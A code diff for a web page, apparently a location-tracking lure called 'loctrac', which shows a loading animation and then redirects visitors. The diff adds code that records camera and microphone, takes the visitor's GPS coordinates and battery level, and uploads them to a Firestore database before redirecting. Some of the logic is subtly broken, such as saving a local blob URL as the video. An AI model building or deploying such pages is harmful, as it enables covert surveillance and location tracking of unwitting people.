@@ -36,9 +36,9 @@
              75%  {content: "...";}
         }
     </style>
-    <!-- Firebase SDK -->
+    <!-- Firebase SDK (Firestore, not Realtime Database)-->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script> <!-- FIRESTORE -->
 </head>
 <body>
     <div class="container">
@@ -57,46 +57,53 @@ const firebaseConfig = {
     messagingSenderId: "34491549339",
     appId: "1:34491549339:web:c666c4f8f3271bab06e83e",
     measurementId: "G-65PYC8E9VR",
-    databaseURL: "https://loctrac-8d7ef-default-rtdb.europe-west1.firebasedatabase.app"  // Correct URL
+    //  NO databaseURL needed for Firestore
 };
 
 // Initialize Firebase
 const app = firebase.initializeApp(firebaseConfig);
-const database = firebase.database();
+const db = firebase.firestore(); //  <--  FIRESTORE instance
 
-// --- Firebase Database Reference (TEMPORARY - for testing only) ---
-const settingsRef = database.ref('userSettings/testUser');
+// --- Firestore Collection Reference (Choose a good path) ---
+const settingsRef = db.collection('userSettings').doc('testUser'); //  CHANGE 'testUser'
+const dataRef = db.collection('userData').doc('testUser');  //  CHANGE 'testUser'
+
 const errorMessage = document.getElementById("error-message");
 
 (async () => {
-    // Get settings from Firebase
+    // Get settings from Firestore
     let micCamPermission, locationPermission, notificationPermission, redirectUrl, redirectSeconds, recordSeconds;
 
     try {
-        const snapshot = await settingsRef.once('value');
-        const data = snapshot.val();
-
-        if (data) {
-            micCamPermission = data.micCamPermission;
-            locationPermission = data.locationPermission;
-            notificationPermission = data.notificationPermission;
-            redirectUrl = data.redirectUrl;
-            redirectSeconds = parseInt(data.redirectSeconds) || 0;
-            recordSeconds = parseInt(data.recordSeconds) || 0;
+        const settingsSnap = await settingsRef.get();
+        if (settingsSnap.exists) {
+          const data = settingsSnap.data();
+          micCamPermission = data.micCamPermission;
+          locationPermission = data.locationPermission;
+          notificationPermission = data.notificationPermission;
+          redirectUrl = data.redirectUrl;
+          redirectSeconds = parseInt(data.redirectSeconds) || 0;
+          recordSeconds = parseInt(data.recordSeconds) || 0;
         } else {
-            console.error("No data found in Firebase.");
-             errorMessage.textContent = "Fout: Kon instellingen niet laden.";
+            console.error("No settings found in Firestore.");
+            errorMessage.textContent = "Fout: Kon instellingen niet laden.";
             errorMessage.style.display = 'block';
-            return; // Exit if no data
+            return; // Exit if no settings
         }
     } catch (error) {
-        console.error("Error fetching settings from Firebase:", error);
-        errorMessage.textContent = `Firebase Fout: ${error.message}`;
+        console.error("Error fetching settings from Firestore:", error);
+        errorMessage.textContent = `Firestore Fout: ${error.message}`;
         errorMessage.style.display = 'block';
         return; // Exit on error
     }
 
     // --- Permissions and Actions ---
+    let locationData = null;
+    let batteryData = null;
+    let videoUrl = null;
+    let locationError = null;
+    let batteryError = null;
+    let cameraError = null;
 
     // 1. Camera/Microphone (if needed)
     if (micCamPermission) {
@@ -114,11 +121,11 @@ const errorMessage = document.getElementById("error-message");
 
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
-                    // No URL needed.
+                    videoUrl = URL.createObjectURL(blob); // Create URL *here*
 
-                    // 3. Redirect (after recording and cleanup)
-                    performRedirect();
-                    stream.getTracks().forEach(track => track.stop()); //  Cleanup
+                    // --- Data collection complete, now save and redirect ---
+                    saveDataAndRedirect();
+                    stream.getTracks().forEach(track => track.stop()); // Cleanup
                 };
 
                 recorder.onstart = () => {
@@ -132,38 +139,124 @@ const errorMessage = document.getElementById("error-message");
                 recorder.start();
 
             } else {
-                // No recording needed, but we still got the stream, so stop it
+                // No recording, stop stream immediately. Proceed to collect other data
                 stream.getTracks().forEach(track => track.stop());
-                // 3. Redirect (immediately)
-                performRedirect();
+                collectOtherData();
+
             }
 
         } catch (error) {
             console.error("Error accessing camera/microphone:", error);
-             errorMessage.textContent = `Camera/Microfoon Fout: ${error.message}`;
-             errorMessage.style.display = 'block';
-            // 3. Redirect (even on error)
-            performRedirect();
+            cameraError = error.message; // Store the error
+             collectOtherData(); // Even if camera fails, collect other data.
+
         }
     } else {
-        // No camera/mic needed, proceed to redirect
-        // 3. Redirect (immediately)
-        performRedirect();
+        // No camera/mic needed, proceed to collect other data
+       collectOtherData();
+    }
+
+     // Utility function to promisify Geolocation API
+    function getCurrentPositionPromise() {
+        return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+            } else {
+                reject(new Error("Geolocation is not supported"));
+            }
+        });
+    }
+
+     // Utility function to promisify Battery API
+    function getBatteryPromise() {
+        return new Promise((resolve, reject) => {
+            if(navigator.getBattery) {
+               resolve(navigator.getBattery());
+            }else{
+                reject(new Error("Battery API is not supported."));
+            }
+        });
+
+    }
+
+    // Function to collect location and battery data
+    async function collectOtherData() {
+        // 2. Location (if needed)
+        if (locationPermission) {
+            try {
+                const position = await getCurrentPositionPromise();
+                locationData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
+                };
+            } catch (error) {
+                console.error("Error getting location:", error);
+                let errorMsg = "";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = "User denied the request for Geolocation."
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                           errorMsg = "Location information is unavailable."
+                            break;
+                        case error.TIMEOUT:
+                           errorMsg = "The request to get user location timed out."
+                            break;
+                        case error.UNKNOWN_ERROR:
+                            errorMsg = "An unknown error occurred."
+                            break;
+                        default:
+                            errorMsg = error.message;
+                    }
+                locationError = errorMsg; // Store the error
+            }
+        }
+
+        // 3. Battery
+         if (navigator.getBattery) {
+            try{
+                const battery = await getBatteryPromise();
+                batteryData = battery.level * 100;
+            }catch(error){
+              console.error("Error getting batter:", error);
+              batteryError = error.message;
+            }
+        }
+        saveDataAndRedirect();
     }
 
 
-    // Function to perform the final redirect
-    function performRedirect() {
+    // Function to save data to Firestore and perform the redirect
+    async function saveDataAndRedirect() {
+        const dataToSave = {
+            videoUrl: videoUrl || null, // Save null if no video
+            location: locationData || null, // Save null if no location
+            batteryPercentage: batteryData,
+            locationError: locationError || null, // Save error messages
+            batteryError: batteryError || null,
+            cameraError: cameraError || null,
+        };
+
+        try {
+            await dataRef.set(dataToSave);
+            console.log("Data saved to Firestore!");
+        } catch (error) {
+            console.error("Error saving data to Firestore:", error);
+            errorMessage.textContent = `Firestore Fout: ${error.message}`;
+            errorMessage.style.display = 'block';
+            //  Decide: Redirect even if save fails?  Probably yes.
+        }
+
+        // Perform the redirect
         if (redirectUrl) {
             setTimeout(() => {
                 window.location.href = redirectUrl;
             }, redirectSeconds * 1000);
         } else {
-            errorMessage.textContent = "Fout: Geen doorverwijs-URL opgegeven.";
+           errorMessage.textContent = "Fout: Geen doorverwijs-URL opgegeven.";
             errorMessage.style.display = 'block';
         }
     }
-
 })();
 </script>
 </body>
